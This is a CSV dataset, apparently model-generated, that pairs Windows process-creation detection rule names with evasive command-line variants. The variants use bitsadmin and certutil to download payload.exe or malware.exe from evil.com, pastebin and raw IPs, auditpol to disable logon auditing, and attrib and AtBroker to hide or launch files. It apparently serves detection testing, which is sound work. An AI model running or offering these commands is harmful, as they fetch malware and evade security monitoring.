rule_name,commandline_evasion,row_count,sources
proc_creation_win_addinutil_uncommon_cmdline,AddInUtil.exe /AddInRoot:C:\\Users\\Public\\Payload,1,gemini
proc_creation_win_addinutil_uncommon_cmdline,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe ""-AddInRoot"":C:\Users\Public\Addins",1,gemini
proc_creation_win_addinutil_uncommon_cmdline,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe -AddInRoot ""C:\Lab\input\sample.txt""",1,qwen14b
proc_creation_win_addinutil_uncommon_cmdline,C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInUtil.exe /AddInRoot:C:\Users\Public\Addins,1,gemini
proc_creation_win_agentexecutor_potential_abuse,AgentExecutor.exe -powershell script.ps1 C:\out.txt C:\err.txt C:\timeout.txt 60000 C:\Windows\System32\WindowsPowerShell\v1.0\ 0,2,gemini; qwen32b
proc_creation_win_atbroker_uncommon_ats_execution,AtBroker.exe /start C:\public\Oracle_JavaAccessBridge\payload.exe,2,gemini; qwen32b
proc_creation_win_atbroker_uncommon_ats_execution,AtBroker.exe /start C:\temp\osk.exe,2,gemini; qwen32b
proc_creation_win_attrib_hiding_files,attrib.exe	+h	C:\Users\thaim\AppData\Local\Temp\T1564.001.txt,1,gemini
proc_creation_win_auditpol_nt_resource_kit_usage,"auditpol.exe ""/logon"":none",1,gemini
proc_creation_win_auditpol_nt_resource_kit_usage,auditpol.exe -logon:none,1,gemini
proc_creation_win_auditpol_nt_resource_kit_usage,auditpol.exe /remove /all,2,gemini; qwen32b
proc_creation_win_auditpol_nt_resource_kit_usage,"auditpol.exe /set /subcategory:""Logon"" /success:disable /failure:disable",2,gemini; qwen32b
proc_creation_win_bash_command_execution,"bash.exe -c""whoami""",2,gemini; qwen32b
proc_creation_win_bcp_export_data,C:\Tools\bcp.exe TestDB.dbo.TestTable	out	C:\Temp\test.txt -c -T,2,gemini:2
proc_creation_win_bcp_export_data,"C:\Tools\bcp.exe TestDB.dbo.TestTable ""out"" C:\Temp\test.txt -c -T",2,gemini:2
proc_creation_win_bcp_export_data,C:\Tools\bcp.exe TestDB.dbo.TestTable out	C:\Temp\test.txt -c -T,2,gemini:2
proc_creation_win_bitsadmin_download_susp_extensions,"bitsadmin -""transfer"" myjob /""download"" /priority normal http://example.com/payload.tmp C:\Users\Public\payload.tmp",4,gemini:4
proc_creation_win_bitsadmin_download_susp_targetfolder,"bitsadmin -""transfer"" myJob /DOWNLOAd -""priority"" high https://evil.com/payload.exe C:\Users\JohnDoe\Downloads\payload.exe",5,gemini:4; qwen32b
proc_creation_win_bitsadmin_download_susp_targetfolder,"bitsadmin -""transfer"" myJob /doWnLoAD /pRiOrIty high https://evil.com/payload.exe C:\Users\JohnDoe\Downloads\payload.exe",5,gemini:4; qwen32b
proc_creation_win_bitsadmin_download_uncommon_targetfolder,"bitsadmin /""transfer"" myJob http://example.com/payload.exe C:\Windows\System32\drivers\etc\payload.exe",5,gemini:4; qwen32b
proc_creation_win_bitsadmin_potential_persistence,"bitsadmin.exe ""/SetNotifyCmdLine"" AtomicBITS powershell.exe ""-Command Start-Process calc.exe""",1,gemini
proc_creation_win_bitsadmin_potential_persistence,"bitsadmin.exe ""/addfile"" AtomicBITS h""tt""ps://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\Public\T1197.ps1",1,gemini
proc_creation_win_bitsadmin_potential_persistence,bitsadmin.exe -addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\thaim\AppData\Local\Temp\bitsadmin3_flag.ps1,1,gemini
proc_creation_win_calc_uncommon_exec,calc.exe -?,2,gemini; qwen32b
proc_creation_win_certoc_download_direct_ip,"certoc.exe -GetCACAPS ""http://192.168.1.100/payload.ext""",2,gemini:2
proc_creation_win_certoc_download_direct_ip,certoc.exe -GetCACAPS http://192.168.1.100/payload.ext,2,gemini:2
proc_creation_win_certoc_download_direct_ip,certoc.exe /GetCACAPS http://192.168.1.100/payload.ext,2,gemini:2
proc_creation_win_certutil_decode,"certutil.exe ""-decode"" input.b64 output.exe",1,gemini
proc_creation_win_certutil_decode,certutil.exe -decode	input.b64 output.exe,1,gemini
proc_creation_win_certutil_download,"certutil.exe -""urlcache"" -split -f ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",2,gemini; qwen32b
proc_creation_win_certutil_download,"certutil.exe -""urlcache"" -split /""f"" ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,certutil.exe -urlcache -split -f ftp://192.168.1.100/malware.exe C:\        emp\malware.exe,2,gemini; qwen32b
proc_creation_win_certutil_download,"certutil.exe /""urlcache"" -""split"" -f ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,"certutil.exe /""urlcache"" -SPlIT -f ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",2,gemini; qwen32b
proc_creation_win_certutil_download,"certutil.exe /""urlcache"" -SpLIt -f ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",1,gemini
proc_creation_win_certutil_download,"certutil.exe /""urlcache"" -splIt /""f"" ftp://192.168.1.100/malware.exe C:\ emp\malware.exe",2,gemini; qwen32b
proc_creation_win_certutil_download_direct_ip,"certutil.exe -""urlcache"" -""split"" /""f"" http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe -""urlcache"" -SpLIt -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe -""urlcache"" -split -f http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe -""urlcache"" /""split"" -F http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" -""split"" -f http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" -""split"" -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" -SPLIT -F http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" -SpLIT -f http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" -split -f http://0xC0000201/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" /""split"" -""f"" http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" /""split"" -F http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_direct_ip,"certutil.exe /""urlcache"" /""split"" -f http://testuser@192.0.2.1/example.txt C:\ emp\example.txt",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-URLcAcHe"" -""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-Urlcache"" -sPLiT -""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe",2,gemini; qwen32b
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-uRLcAchE"" /""split"" -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-uRlCacHe"" -split -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",2,gemini; qwen32b
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"" -SPLIT -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"" -SPLiT -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",2,gemini; qwen32b
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"" -split -f https://pastebin.com/raw/example123 C:\	emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"" -split /""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"""" -split -f https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
proc_creation_win_certutil_download_file_sharing_domains,"certutil.exe ""-urlcache"""" /""split"" -""f"" https://pastebin.com/raw/example123 C:\ emp\payload.exe",1,gemini
